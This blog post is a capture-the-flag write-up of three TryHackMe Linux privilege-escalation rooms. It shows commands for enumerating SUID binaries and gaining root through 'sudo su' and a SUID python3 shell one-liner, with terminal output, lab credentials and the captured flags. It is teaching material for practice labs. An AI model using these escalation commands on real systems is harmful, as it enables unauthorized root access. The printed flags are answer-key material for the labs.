---
id: 658
title: "VIT Zypher CTF solutions for 3 special challenges  "
created: 2023-11-07T16:00:32+00:00
url: https://hacklido.com/blog/658-vit-zypher-ctf-solutions-for-3-special-challenges
words: 2520
---

# VIT Zypher CTF solutions for 3 special challenges  

[image]

# Introduction

On November 6th, 2023, VIT chennai conducted a capture the flag event in which we got third place, [actually second, because technically speaking we both have same points ] but anyways, it was the special challenges that made us won, because it literally boosted us with 180-190 points. Now wish we could be able to solve the remaining 2 special challenges but due to time constraint we were unable to.

The aim of this blog is to make it super easy to understand some linux privilege escalation, and if you just a beginner, then worry not following the steps and reading the whole blog just once should make sense to you.

# Tools and utilities required.

- Obsidian app for note taking

- Hack-tools chrome extension which holds all the commands for basic level of pentesting and chrome user’s can download this extension from the below mentioned url.

 https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi/related https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi/related

[image]

Once you have added this tool to your chrome, pin it up so you can use it freely!

[image]

- Tryhackme preimum subscription, because it allows us to spawn an attack box, [custom ubuntu machine] which comes preloaded with all the tools we need. This is extremely helpful as you get to access this via a browser instance and personally I liked it because who does not want to hack just using web browser?

And the internet speed at tryhackme’s network is really good which is around 600-700 mbps!! The best part is you don’t have to worry about connecting via `vpn` !!!

# Additional knowledge required to solve this challenges.

[image]

#### 1. To get stable shell

```
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
```

Let’s break down the command shall we?

- `python3`: This starts the Python 3 interpreter.

- `-c`: This flag allows you to provide a Python script as a command-line argument.

- `'import pty; pty.spawn("/bin/bash")'`: This Python script imports the `pty` module, which provides pseudo-terminal handling, and then spawns an interactive Bash shell by calling `/bin/bash`.

In simpler terms, it’s a way to upgrade a basic shell into a fully interactive one, which can be helpful during penetration testing or solving ctfs.

Do note that you don’t have to remember this command, the third option under `hacktools` browser extension has it all, just make sure you understand what you are copy pasting or typing.

[image]

#### 2. Finding `suid binaries`

For those who are new, `SUID (Set User ID) Linux binaries are programs that run with the permissions of the file's owner which is the root user, along with elevated privileges, allowing non-privileged users to perform specific tasks as if they were the owner or the root user.`

Basically it allows for an hacker to get extra privileges which the hacker is not supposed to get. Now there is one linux command that finds all the `suid binaries` so that we can try out if we get elevated privileges.

```
`find / -user root -perm /4000 2>/dev/null`
```

The command `find / -user root -perm /4000 2>/dev/null` is used to search the entire filesystem for files that meet two criteria:

- `-user root`: It finds files owned by the user “root.” In other words, it searches for files that are specifically owned by the superuser “root.”

- `-perm /4000`: This looks for files with the “setuid,” “setgid,” or “sticky” permission bits set. In this context, “4000” is a symbolic representation of these permission bits.

    - “4” represents the setuid bit.

    - “2” represents the setgid bit.

    - “1” represents the sticky bit.

`2>/dev/null` is used to redirect any error messages to `/dev/null`, effectively suppressing error messages.

So, the command searches for files owned by the “root” user that have the setuid, setgid, or sticky bits set, which can be potential targets for privilege escalation or other security-related investigations.

#### 3. GTFO BINS { https://gtfobins.github.io/ https://gtfobins.github.io/}

GTFOBins (Get The F*** Out Bins) is a resource that lists Unix binaries and their known security weaknesses, making it easier for both ethical hackers and attackers to find ways to exploit these binaries to gain unauthorized access or perform malicious actions on a system.

In simple ways, if you are doing linux privilege escalation, don’t forget to try out gtfo bins !!

# Solving special challenges …

## Challenge 1 : Elevate 1

Room url -  https://tryhackme.com/jr/awdawd https://tryhackme.com/jr/awdawd

First let’s follow the instructions, and `ssh` into the machine. In our case the command to ssh into the machine is `ssh ctf@10.10.186.185` and the password is `letmein`. Now let’s check who we are, and it has been tested that there is no `flag.txt` or `user.txt` in the machine it self and you can use find command to do that. NOTE THAT THIS DOES NOT RESULT IN ANYTHING ….

```
`find / -name "flag.txt" 2>/dev/null
find / -name "user.txt" 2>/dev/null`
```

Secondly use of any automation script such as `linpeas` or `pspy64` does not yield effective results. Firstly `chomod +x file` is not enough to run, as ubuntu does not execute the script. Despite this restriction, you need to give `read` and `execute` permissions. Which can be done if you follow `chmod u+r+x filename.sh` command. But do note that the results can be overwhelming, and we have learnt our lesson '‘USE OF AUTOMATED PRIVILEGE ESCALATION SCRIPT CAN BE OVERWHELMING AND TIME CONSUMING AND WASTES A LOT OF TIME !!!’'

Trust me when I say this, I have wasted more than 40 minutes getting stuck in rabbit hole, trying all the scripts `exploitsuggester`, `kernelexploits from exploitdb` and what not, all failed and did not work. Now I had to rethink my options, what if things were way simpler than it appears to be…. why not try exploiting the linux `suid` binaries…

#### Step 0 - Get stable shell using python so that we can use up arrow to use previous command and we can use things like copy and pasting.

```
`python3 -c 'import pty;pty.spawn("/bin/bash")'`
```

#### Step 1 - Run `find / -user root -perm /4000 2>/dev/null` command.

A hacker can exploit these to gain elevated access which the person is not supposed to have. Now let’s run the command to find the `suid binaries` in our system.

```
`ctf@hackerspace:~$ find / -user root -perm /4000 2>/dev/null
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/su
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/pkexec
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1`
```

#### Step 2, manually look for all the binaries under `/usr/bin` and check out gtfo bins for commands to escalate our privileges.

We see an interesting file under `/usr/bin/su` and checking gtfo bins we see the command `sudo su`, and let’s try the command.

In the gtfo bin website, we have a special section for `su` feel free to check out using the following url  https://gtfobins.github.io/gtfobins/su/ https://gtfobins.github.io/gtfobins/su/ .

[image]

```
`ctf@hackerspace:~$ sudo su
root@hackerspace:/home/ctf# whoami
root
root@hackerspace:/home/ctf# cd /root ; cat flag.txt
hacker{0n_th3_top_fl0Or}`
```

Luckily for us the command works and we can get our flag 🙂.

## Challenge 2: Elevate 2

To join this challenge simply visit the URL mentioned below. After connecting to the tryhackme’s network using a `ovpn` file use ssh to login to the machine which is given in the task it’self. In my case it’s `ssh ctf@10.10.141.211` and password is `letmein`

Room url -  https://tryhackme.com/jr/elevate2 https://tryhackme.com/jr/elevate2

This is labelled as medium linux box, where the flag is hidden under `/root` directory and in order to get the flag you need to escalate your privileges.

#### Step 1 - Check your privileges and get a stable shell using python command

After getting into the machine use python to spawn a stable shell so that we can go back and forth using up arrow to go through commands without typing in and it also helps us to use copy and paste features.

```
`$ whoami
ctf
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bash-5.0$ ls`
```

#### Step 2- Run the `find / -user root -perm /4000 2>/dev/null` command and do make a note of only `/usr/bin` files, it might come handy while trying to exploit suid binaries.

Now, we know that `/snap/` is a package manager and the odds of finding some way to elevate access is quite low and the same holds true for `/usr/lib`. We will be focusing on all the things that start with `/usr/bin` and lets copy the contents to a text file.

```
`bash-5.0$ find / -user root -perm /4000 2>/dev/null
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
/usr/bin/umount
/usr/bin/vim.basic
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/su
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/python3.8
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/pkexec
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1`
```

Now we go and visit our favourite website gtfo bins, which is our go to website for manual privilege escalation. From our system’s initial access, the user which we are is not in the `sudoers` list, which means all the privilege escalation vectors that have `sudo` command will not work. That’s a relief, and after a bit of trial and error found something interesting to python.

#### Step 3 - Visit gtfo bins, search python and try various commands, the one with suid label should work.

 https://gtfobins.github.io/gtfobins/python/ https://gtfobins.github.io/gtfobins/python/

[image]

#### Step 4 - Modify the command a bit, and get the flag.

Now we do know that sudo command will not work, so here is what we do, we will use the second command. But wait we do get error when we use the second command.

[image]

This is because python3 can be automatically run on terminal from path, and there is no need to mention it using `./` and also `python` refers to `python2` which is not installed by default in many linux systems, therefore we replace `./python` with `python3`.

```
`python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
```

Now running the above command gives us the root access and we can get our flag easily

[image]

## Challenge 3: Elevate 3

Room url -  https://tryhackme.com/jr/elevate3 https://tryhackme.com/jr/elevate3

As always `ssh` into the box, and then let’s get started. And in my case `ssh ctf@10.10.223.254` and the password is same for all users which is `letmein`. Do note that by the start of machine itself we are getting a stable shell and therefore it’s not required to use python to get an interactive shell.

#### Step 1- Run the `find / -user root -perm /4000 2>/dev/null` command and do make a note of only `/usr/bin` files…

Running the above mentioned command displays list of `suid` binaries, but interestingly we see `/usr/bin/python3.8` which means there is a slight chance the very same command which we used for `elevate2` may work here.

```
`ctf@hackerspace:~$ find / -user root -perm /4000 2>/dev/null
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
/usr/bin/umount
/usr/bin/vim.basic
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/su
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/python3.8
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/pkexec
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1`
```

#### Step 2 - Visit gtfo bins, search python modify as we did in `elevate2` machine.

By following the very same steps which we did for `elevate2` we get the flag 🙂.

```
`ctf@hackerspace:~$ python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
# cd /root ; cat flag.txt
hacker{you_should_have_stayed_at_home}
# `
```

# Conclusion

With this we have solved ⅗ special ctfs and I am sure if you are just starting out you must have learned a thing or two about privilege escalation. This is quite a lengthy blog of more than 2000 words [including some terminal output], and kudos to you if you have this far.

Our team is named `double-dragons` and here is the final leader board of the vit ctf.

[image]

If you wish to reach out to our ctf team, feel free to reach us out via  :-

## Team `Double-dragons`

#### 1. Kavin Surya -  [aka oda67]

linkedin -  http://www.linkedin.com/in/kavin-surya-494a49234 http://www.linkedin.com/in/kavin-surya-494a49234

tryhackme -   https://tryhackme.com/p/oda67 https://tryhackme.com/p/oda67

twitter-  https://twitter.com/kavinsurya067 https://twitter.com/kavinsurya067

#### 2. Madhura Nadh [which is me aka mccleod1290]

linkedin -   https://www.linkedin.com/in/k-madhura-nadh https://www.linkedin.com/in/k-madhura-nadh

tryhackme -   https://tryhackme.com/p/mccleod1290 https://tryhackme.com/p/mccleod1290

twitter-  https://twitter.com/mccleod1290 https://twitter.com/mccleod1290
